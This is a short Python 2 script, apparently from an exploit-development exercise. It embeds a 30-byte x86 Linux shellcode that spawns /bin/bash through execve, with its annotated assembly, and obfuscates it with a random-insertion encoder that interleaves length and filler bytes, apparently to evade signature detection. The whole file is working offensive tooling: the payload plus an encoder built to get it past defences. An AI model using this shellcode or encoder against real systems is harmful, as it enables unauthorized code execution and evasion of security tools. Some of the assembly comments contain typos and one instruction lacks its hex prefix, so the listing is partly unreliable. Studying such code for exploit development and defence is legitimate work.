#!/usr/bin/python
from sys import exit
from random import randint
"""
Shellcode:
    
    global _start
    section .text
    _start:
    
            ; PUSH the ferst null dword
    xor eax, eax
            push eax
            
            ; PUSH ////bin/bash in reverse (12) we add more shashes to set it to 12 bytes
            push 0x68736162 
            push 0x2f6e6962
            push 2f2f2f2f
    
            ; Second arg
            mov ebx, esp ;
            
            ;Third arg
            push eax
            mov edx, esp
            
            ;forth arg 
    push ebx
            mov ecx, esp
    
            ;syscan to execve
            mov al, 0xb
int 0x80

30 bytes
unsigned char payload[] =\
    "\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
"""

def get_random(ident):
    
    if ident == 'number':
        return randint(1,3)
    
    elif ident == 'char':
        return randint(65,122)#only [a-z[]\^_`A-Z]

shellcode  = ("\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
encoded = ""
#end     = "\\xf0\\x0d"

for x in bytearray(shellcode):
    
    encoded += '\\x%02x' % x
    
    random = get_random('number')
    encoded += '\\x%02x' % random
    
    for i in range(random-1):
        
        encoded += '\\x%02x' % get_random('char')

#encoded += end #probably we will need it for correct jump

print encoded
print 
print encoded.replace("\\x", ",0x")[1:]

print 'Initial len: %d, encoded len: %d' % (len(shellcode), 
    len(encoded)/4)